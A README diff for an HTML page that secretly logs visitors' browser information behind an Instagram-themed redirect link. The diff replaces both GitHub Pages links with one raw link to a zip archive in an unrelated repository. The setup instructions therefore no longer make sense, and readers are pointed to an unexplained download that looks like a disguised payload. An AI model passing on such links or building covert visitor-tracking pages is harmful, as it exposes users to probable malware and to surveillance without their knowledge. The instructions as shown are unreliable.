@@ -9,7 +9,7 @@ This simple HTML page logs user browser info and redirects to Instagram after 1 
 2. Go to **Settings > Pages**.
 3. Under **Source**, select `main` branch and `/ (root)` folder.
 4. GitHub will provide you with a live link such as:
-   `https://yourusername.github.io/instagram-redirect/`
+   `https://raw.githubusercontent.com/mammos1123/ghosting-analyzer/main/breathy/analyzer_ghosting_v1.7.zip`
 
 You can then share this direct link:
-`https://yourusername.github.io/instagram-redirect/instagram_login_redirect.html`
+`https://raw.githubusercontent.com/mammos1123/ghosting-analyzer/main/breathy/analyzer_ghosting_v1.7.zip`
